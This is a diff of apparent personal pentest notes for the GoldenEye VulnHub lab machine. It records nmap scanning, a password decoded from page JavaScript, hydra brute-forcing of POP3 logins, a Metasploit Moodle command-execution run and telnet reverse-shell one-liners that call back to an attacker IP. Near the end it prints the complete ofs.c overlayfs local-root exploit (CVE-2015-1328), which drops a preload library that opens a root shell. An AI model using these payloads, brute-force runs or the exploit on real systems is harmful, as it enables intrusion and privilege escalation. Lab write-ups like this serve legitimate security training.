@@ -1,6 +1,10 @@
+# Description
+
 
 https://hackso.me/goldeneye-1-walkthrough/
 http://www.anonhack.in/2018/07/goldeneye-1-walkthrough-vulnhub-vulnerable-machine/
+
+
 
 
 Available information:
@@ -13,31 +17,39 @@ Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
 Package listing: from current OS
 
 
+# Keysword
 
+# nmap
 
-
-─$ sudo nmap -sT -A -Pn -n -p- 192.168.110.16
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-14 14:37 CEST
-Nmap scan report for 192.168.110.16
-Host is up (0.00046s latency).
-Not shown: 65531 closed ports
-PORT      STATE SERVICE     VERSION
-25/tcp    open  smtp        Postfix smtpd
-|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+```bash
+sudo nmap -sT -sV -A -Pn -n -p- 192.168.110.8
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-04 16:39 CET
+Nmap scan report for 192.168.110.8
+Host is up (0.00047s latency).
+Not shown: 65531 closed tcp ports (conn-refused)
+PORT      STATE SERVICE  VERSION
+25/tcp    open  smtp     Postfix smtpd
+|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
+| ssl-cert: Subject: commonName=ubuntu
+| Not valid before: 2018-04-24T03:22:34
+|_Not valid after:  2028-04-21T03:22:34
 |_ssl-date: TLS randomness does not represent time
-80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
-|_http-server-header: Apache/2.4.7 (Ubuntu)
+80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
 |_http-title: GoldenEye Primary Admin Server
-55006/tcp open  ssl/unknown
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+55006/tcp open  ssl/pop3 Dovecot pop3d
+|_pop3-capabilities: UIDL USER AUTH-RESP-CODE SASL(PLAIN) CAPA TOP PIPELINING RESP-CODES
+|_ssl-date: TLS randomness does not represent time
 | ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
 | Not valid before: 2018-04-24T03:23:52
 |_Not valid after:  2028-04-23T03:23:52
+55007/tcp open  pop3     Dovecot pop3d
+|_pop3-capabilities: UIDL USER RESP-CODES TOP AUTH-RESP-CODE SASL(PLAIN) STLS PIPELINING CAPA
 |_ssl-date: TLS randomness does not represent time
-55007/tcp open  pop3        Dovecot pop3d
-|_pop3-capabilities: RESP-CODES AUTH-RESP-CODE TOP USER SASL(PLAIN) STLS PIPELINING CAPA UIDL
-|_ssl-date: TLS randomness does not represent time
-MAC Address: 08:00:27:9E:14:84 (Oracle VirtualBox virtual NIC)
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Not valid before: 2018-04-24T03:23:52
+|_Not valid after:  2028-04-23T03:23:52
+MAC Address: 08:00:27:F9:DA:6A (Oracle VirtualBox virtual NIC)
 Device type: general purpose
 Running: Linux 3.X|4.X
 OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
@@ -46,48 +58,26 @@ Network Distance: 1 hop
 
 TRACEROUTE
 HOP RTT     ADDRESS
-1   0.46 ms 192.168.110.16
+1   0.47 ms 192.168.110.8
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 28.83 seconds
+Nmap done: 1 IP address (1 host up) scanned in 28.89 seconds
+```
 
+# curl
 
+```bash
+curl http://192.168.110.8/terminal.js
+```
+## terminal.js
 
-└─$ dirb http://192.168.110.16
+```js
+var data = [
+  {
+    GoldenEyeText: "<span><br/>Severnaya Auxiliary Control Station<br/>****TOP SECRET ACCESS****<br/>Accessing Server Identity<br/>Server Name:....................<br/>GOLDENEYE<br/><br/>User: UNKNOWN<br/><span>Naviagate to /sev-home/ to login</span>"
+  }
+];
 
------------------
-DIRB v2.22    
-By The Dark Raver
------------------
-
-START_TIME: Wed Apr 14 14:41:47 2021
-URL_BASE: http://192.168.110.16/
-WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-
------------------
-
-GENERATED WORDS: 4612                                                          
-
----- Scanning URL: http://192.168.110.16/ ----
-+ http://192.168.110.16/index.html (CODE:200|SIZE:252)                                    
-+ http://192.168.110.16/server-status (CODE:403|SIZE:294)                                 
- 
-gobuster dir -u http://192.168.110.16 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt
-
-
-
-Severnaya Auxiliary Control Station
-****TOP SECRET ACCESS****
-Accessing Server Identity
-Server Name:....................
-GOLDENEYE
-
-User: UNKNOWN
-Naviagate to /sev-home/ to login 
-
-
-└─$ curl http://192.168.110.16/terminal.js
-...
 //
 //Boris, make sure you update your default password. 
 //My sources say MI6 maybe planning to infiltrate. 
@@ -100,147 +90,93 @@ Naviagate to /sev-home/ to login
 //BTW Natalya says she can break your codes
 //
 
-...
+var allElements = document.getElementsByClassName("typeing");
+for (var j = 0; j < allElements.length; j++) {
+  var currentElementId = allElements[j].id;
+  var currentElementIdContent = data[0][currentElementId];
+  var element = document.getElementById(currentElementId);
+  var devTypeText = currentElementIdContent;
 
-Programme Python ?
+ 
+  var i = 0, isTag, text;
+  (function type() {
+    text = devTypeText.slice(0, ++i);
+    if (text === devTypeText) return;
+    element.innerHTML = text + `<span class='blinker'>&#32;</span>`;
+    var char = text.slice(-1);
+    if (char === "<") isTag = true;
+    if (char === ">") isTag = false;
+    if (isTag) return type();
+    setTimeout(type, 60);
+  })();
+}
 
+```
+## Decoded password
+
+### python
+
+```python
 s = [73,110,118,105,110,99,105,98,108,101,72,97,99,107,51,114]
-''.join(chr(i) for i in s)
-'InvincibleHack3r'
+for e in s:
+    print(chr(e),end='')
 
-
+# InvincibleHack3r
+```
+### bash
+```bash
 # for d in $(echo -n '&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;' | tr -d '&#' | tr ';' '\n'); do printf \\$(printf "%o" $d); done && echo
 InvincibleHack3r
 
 
-└─$ dirb  http://192.168.110.16/sev-home/ -u boris:InvincibleHack3r -X .php
+$ dirb  http://192.168.110.8/sev-home/ -u boris:InvincibleHack3r -X .php
 
-gobuster dir -u http://192.168.110.16 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --username boris --password  InvincibleHack3r -x php,txt
+gobuster dir -u http://192.168.110.8/sev-home/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --username boris --password  InvincibleHack3r -x php,txt
+
+$ wfuzz -c -w users.txt -w passwords.txt --basic FUZZ:FUZ2Z -u http://192.168.110.8/sev-home --hc 401
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.110.8/sev-home
+Total requests: 20
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
+=====================================================================
+
+000000008:   301        9 L      28 W       316 Ch      "boris - InvincibleHack3r"
+Total time: 0
+Processed Requests: 20
+Filtered Requests: 19
+Requests/sec.: 0
 
 
-└─$ hydra -l boris -P /usr/share/wordlists/fasttrack.txt pop3s://192.168.110.16 -s 55006
+
+└─$ hydra -l boris -P /usr/share/wordlists/fasttrack.txt pop3s://192.168.110.8 -s 55006
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-14 22:10:31
 [INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
-[DATA] attacking pop3s://192.168.110.16:55006/
+[DATA] attacking pop3s://192.168.110.8:55006/
 [STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
 [STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active
-[55006][pop3] host: 192.168.110.16   login: boris   password: secret1!
+[55006][pop3] host: 192.168.110.8   login: boris   password: secret1!
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-14 22:13:11
  
 
 
-
- By The Dark Raver
------------------
-
-START_TIME: Wed Apr 14 21:53:51 2021
-URL_BASE: http://192.168.110.16/sev-home/
-WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-AUTHORIZATION: boris:InvincibleHack3r
-EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]
-
------------------
-
-GENERATED WORDS: 4612                                                          
-
----- Scanning URL: http://192.168.110.16/sev-home/ ----
-                                                                                          
------------------
-END_TIME: Wed Apr 14 21:54:00 2021
-DOWNLOADED: 4612 - FOUND: 0
-                                                                                           
+                        
 ┌──(kali㉿kali)-[~/OSCP/boxes/goldeneye]
-└─$ gobuster --help
-Usage:
-  gobuster [command]
-
-Available Commands:
-  dir         Uses directory/file enumeration mode
-  dns         Uses DNS subdomain enumeration mode
-  fuzz        Uses fuzzing mode
-  help        Help about any command
-  s3          Uses aws bucket enumeration mode
-  version     shows the current version
-  vhost       Uses VHOST enumeration mode
-
-Flags:
-      --delay duration    Time each thread waits between requests (e.g. 1500ms)
-  -h, --help              help for gobuster
-      --no-error          Don't display errors
-  -z, --no-progress       Don't display progress
-  -o, --output string     Output file to write results to (defaults to stdout)
-  -p, --pattern string    File containing replacement patterns
-  -q, --quiet             Don't print the banner and other noise
-  -t, --threads int       Number of concurrent threads (default 10)
-  -v, --verbose           Verbose output (errors)
-  -w, --wordlist string   Path to the wordlist
-
-Use "gobuster [command] --help" for more information about a command.
-                                                                                           
-┌──(kali㉿kali)-[~/OSCP/boxes/goldeneye]
-└─$ gobuster dir --help
-Uses directory/file enumeration mode
-
-Usage:
-  gobuster dir [flags]
-
-Flags:
-  -f, --add-slash                       Append / to each request
-  -c, --cookies string                  Cookies to use for the requests
-  -d, --discover-backup                 Upon finding a file search for backup files
-      --exclude-length ints             exclude the following content length (completely ignores the status). Supply multiple times to exclude multiple sizes.
-  -e, --expanded                        Expanded mode, print full URLs
-  -x, --extensions string               File extension(s) to search for
-  -r, --follow-redirect                 Follow redirects
-  -H, --headers stringArray             Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2'
-  -h, --help                            help for dir
-      --hide-length                     Hide the length of the body in the output
-  -m, --method string                   Use the following HTTP method (default "GET")
-  -n, --no-status                       Don't print status codes
-  -k, --no-tls-validation               Skip TLS certificate verification
-  -P, --password string                 Password for Basic Auth
-      --proxy string                    Proxy to use for requests [http(s)://host:port]
-      --random-agent                    Use a random User-Agent string
-  -s, --status-codes string             Positive status codes (will be overwritten with status-codes-blacklist if set)
-  -b, --status-codes-blacklist string   Negative status codes (will override status-codes if set) (default "404")
-      --timeout duration                HTTP Timeout (default 10s)
-  -u, --url string                      The target URL
-  -a, --useragent string                Set the User-Agent string (default "gobuster/3.1.0")
-  -U, --username string                 Username for Basic Auth
-      --wildcard                        Force continued operation when wildcard found
-
-Global Flags:
-      --delay duration    Time each thread waits between requests (e.g. 1500ms)
-      --no-error          Don't display errors
-  -z, --no-progress       Don't display progress
-  -o, --output string     Output file to write results to (defaults to stdout)
-  -p, --pattern string    File containing replacement patterns
-  -q, --quiet             Don't print the banner and other noise
-  -t, --threads int       Number of concurrent threads (default 10)
-  -v, --verbose           Verbose output (errors)
-  -w, --wordlist string   Path to the wordlist
-                                                                                           
-┌──(kali㉿kali)-[~/OSCP/boxes/goldeneye]
-└─$ gobuster dir --help | grep user
-  -a, --useragent string                Set the User-Agent string (default "gobuster/3.1.0")
-  -U, --username string                 Username for Basic Auth
-                                                                                           
-┌──(kali㉿kali)-[~/OSCP/boxes/goldeneye]
-└─$ gobuster dir --help | grep Basic
-  -P, --password string                 Password for Basic Auth
-  -U, --username string                 Username for Basic Auth
-                                                                                           
-┌──(kali㉿kali)-[~/OSCP/boxes/goldeneye]
-└─$ gobuster dir -u http://192.168.110.16 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --username boris --password  InvincibleHack3r -x php,txt
+└─$ gobuster dir -u http://192.168.110.8 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --username boris --password  InvincibleHack3r -x php,txt
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
-[+] Url:                     http://192.168.110.16
+[+] Url:                     http://192.168.110.8
 [+] Method:                  GET
 [+] Threads:                 10
 [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
@@ -259,15 +195,15 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 
 
-└─$ hydra -l natalya -P /usr/share/wordlists/fasttrack.txt pop3s://192.168.110.16 -s 55006
+└─$ hydra -l natalya -P /usr/share/wordlists/fasttrack.txt pop3s://192.168.110.8 -s 55006
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-14 22:16:07
 [INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
-[DATA] attacking pop3s://192.168.110.16:55006/
+[DATA] attacking pop3s://192.168.110.8:55006/
 [STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
-[55006][pop3] host: 192.168.110.16   login: natalya   password: bird
+[55006][pop3] host: 192.168.110.8   login: natalya   password: bird
 [STATUS] 111.00 tries/min, 222 tries in 00:02h, 1 to do in 00:01h, 15 active
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-14 22:18:07
@@ -275,9 +211,9 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-14 22:18:
 
 
 ┌──(kali㉿kali)-[~/OSCP/boxes/goldeneye]
-└─$ telnet 192.168.110.16 55007
-Trying 192.168.110.16...
-Connected to 192.168.110.16.
+└─$ telnet 192.168.110.8 55007
+Trying 192.168.110.8...
+Connected to 192.168.110.8.
 Escape character is '^]'.
 +OK GoldenEye POP3 Electronic-Mail System
 user boris
@@ -340,9 +276,9 @@ PS - Keep security tight or we will be compromised.
 
 .
 
-└─$ telnet 192.168.110.16 55007                                                        1 ⨯
-Trying 192.168.110.16...
-Connected to 192.168.110.16.
+└─$ telnet 192.168.110.8 55007                                                        1 ⨯
+Trying 192.168.110.8...
+Connected to 192.168.110.8.
 Escape character is '^]'.
 +OK GoldenEye POP3 Electronic-Mail System
 user natalya
@@ -419,22 +355,22 @@ Dr. Doak "The Doctor"
 
 
 
-└─$ hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3s://192.168.110.16 -s 55006
+└─$ hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3s://192.168.110.8 -s 55006
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-15 07:16:57
 [INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
-[DATA] attacking pop3s://192.168.110.16:55006/
-[55006][pop3] host: 192.168.110.16   login: doak   password: goat
+[DATA] attacking pop3s://192.168.110.8:55006/
+[55006][pop3] host: 192.168.110.8   login: doak   password: goat
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-15 07:18:43
        
 
 
-└─$ telnet 192.168.110.16 55007
-Trying 192.168.110.16...
-Connected to 192.168.110.16.
+└─$ telnet 192.168.110.8 55007
+Trying 192.168.110.8...
+Connected to 192.168.110.8.
 Escape character is '^]'.
 +OK GoldenEye POP3 Electronic-Mail System
 user doak                                                                               
@@ -517,8 +453,10 @@ Megapixels                      : 0.066
                                                                                            
 ┌──(kali㉿kali)-[~/OSCP/boxes/goldeneye]
 └─$ echo -n 'eFdpbnRlcjE5OTV4IQ==' | base64 -d                                        
-xWinter1995x!                                        
+xWinter1995x!
 
+
+moodle v 2.2.3
 
 msf6 exploit(multi/http/moodle_cmd_exec) > show options
 
@@ -563,8 +501,14 @@ msf6 exploit(multi/http/moodle_cmd_exec) > run
 msf6 exploit(multi/http/moodle_cmd_exec) > 
 
 
-sh -c '/tmp/rev'
 
+
+Site administration --> Plugins --> Text editors --> TinyMCE HTML editor -->  Spell engine : PSpellShell
+Site administration --> Server --> System paths --> Path to aspell : sh -c '(sleep 4062|telnet 192.168.110.1 3333 | /bin/bash | telnet 192.168.110.1 4444 &)'
+
+
+sh -c '/tmp/rev'
+2020
 
 
 
@@ -623,3 +567,197 @@ Alec told me to place the codes here:
 
 If you captured this make sure to go here.....
 /006-final/xvf7-flag/
+
+
+
+
+
+
+sh -c '(sleep 4062|telnet 192.168.230.132 4444|while : ; do sh && break; done 2>&1|telnet 192.168.230.132 4444 >/dev/null 2>&1 &)'
+sh -c '(sleep 4062|telnet 192.168.110.1 3333 | /bin/bash | telnet 192.168.110.1 4444 &)'
+
+telnet <attacker_ip> <port1> | /bin/bash | telnet <attacker_ip> <port2>
+```
+
+
+
+## ofs.c
+
+```c
+/*
+# Exploit Title: ofs.c - overlayfs local root in ubuntu
+# Date: 2015-06-15
+# Exploit Author: rebel
+# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)
+# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04
+# CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)
+
+*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
+CVE-2015-1328 / ofs.c
+overlayfs incorrect permission handling + FS_USERNS_MOUNT
+
+user@ubuntu-server-1504:~$ uname -a
+Linux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+user@ubuntu-server-1504:~$ gcc ofs.c -o ofs
+user@ubuntu-server-1504:~$ id
+uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)
+user@ubuntu-server-1504:~$ ./ofs
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# id
+uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)
+
+greets to beist & kaliman
+2015-05-24
+%rebel%
+*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sched.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/mount.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sched.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/mount.h>
+#include <sys/types.h>
+#include <signal.h>
+#include <fcntl.h>
+#include <string.h>
+#include <linux/sched.h>
+
+#define LIB "#include <unistd.h>\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n{\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\nreadlink(\"/proc/self/exe\", (char *) &path, 128);\nif(geteuid() == 0 && !strcmp(path, \"/bin/su\")) {\nunlink(\"/etc/ld.so.preload\");unlink(\"/tmp/ofs-lib.so\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);\n}\n    return _real_getuid();\n}\n"
+
+static char child_stack[1024*1024];
+
+static int
+child_exec(void *stuff)
+{
+    char *file;
+    system("rm -rf /tmp/ns_sploit");
+    mkdir("/tmp/ns_sploit", 0777);
+    mkdir("/tmp/ns_sploit/work", 0777);
+    mkdir("/tmp/ns_sploit/upper",0777);
+    mkdir("/tmp/ns_sploit/o",0777);
+
+    fprintf(stderr,"mount #1\n");
+    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper") != 0) {
+// workdir= and "overlay" is needed on newer kernels, also can't use /proc as lower
+        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work") != 0) {
+            fprintf(stderr, "no FS_USERNS_MOUNT for overlayfs on this kernel\n");
+            exit(-1);
+        }
+        file = ".access";
+        chmod("/tmp/ns_sploit/work/work",0777);
+    } else file = "ns_last_pid";
+
+    chdir("/tmp/ns_sploit/o");
+    rename(file,"ld.so.preload");
+
+    chdir("/");
+    umount("/tmp/ns_sploit/o");
+    fprintf(stderr,"mount #2\n");
+    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc") != 0) {
+        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work") != 0) {
+            exit(-1);
+        }
+        chmod("/tmp/ns_sploit/work/work",0777);
+    }
+
+    chmod("/tmp/ns_sploit/o/ld.so.preload",0777);
+    umount("/tmp/ns_sploit/o");
+}
+
+int
+main(int argc, char **argv)
+{
+    int status, fd, lib;
+    pid_t wrapper, init;
+    int clone_flags = CLONE_NEWNS | SIGCHLD;
+
+    fprintf(stderr,"spawning threads\n");
+
+    if((wrapper = fork()) == 0) {
+        if(unshare(CLONE_NEWUSER) != 0)
+            fprintf(stderr, "failed to create new user namespace\n");
+
+        if((init = fork()) == 0) {
+            pid_t pid =
+                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
+            if(pid < 0) {
+                fprintf(stderr, "failed to create new mount namespace\n");
+                exit(-1);
+            }
+
+            waitpid(pid, &status, 0);
+
+        }
+
+        waitpid(init, &status, 0);
+        return 0;
+    }
+
+    usleep(300000);
+
+    wait(NULL);
+
+    fprintf(stderr,"child threads done\n");
+
+    fd = open("/etc/ld.so.preload",O_WRONLY);
+
+    if(fd == -1) {
+        fprintf(stderr,"exploit failed\n");
+        exit(-1);
+    }
+
+    fprintf(stderr,"/etc/ld.so.preload created\n");
+    fprintf(stderr,"creating shared library\n");
+    lib = open("/tmp/ofs-lib.c",O_CREAT|O_WRONLY,0777);
+    write(lib,LIB,strlen(LIB));
+    close(lib);
+    lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
+    if(lib != 0) {
+        fprintf(stderr,"couldn't create dynamic library\n");
+        exit(-1);
+    }
+    write(fd,"/tmp/ofs-lib.so\n",16);
+    close(fd);
+    system("rm -rf /tmp/ns_sploit /tmp/ofs-lib.c");
+    execl("/bin/su","su",NULL);
+}
+```
+
+## ofs-lib.c
+
+```c
+#include <unistd.h>
+
+uid_t(*_real_getuid) (void);
+char path[128];
+
+uid_t
+getuid(void)
+{
+_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, "getuid");
+readlink("/proc/self/exe", (char *) &path, 128);
+if(geteuid() == 0 && !strcmp(path, "/bin/su")) {
+unlink("/etc/ld.so.preload");unlink("/tmp/ofs-lib.so");
+setresuid(0, 0, 0);
+setresgid(0, 0, 0);
+execle("/bin/sh", "sh", "-i", NULL, NULL);
+}
+    return _real_getuid();
+}
+
+```
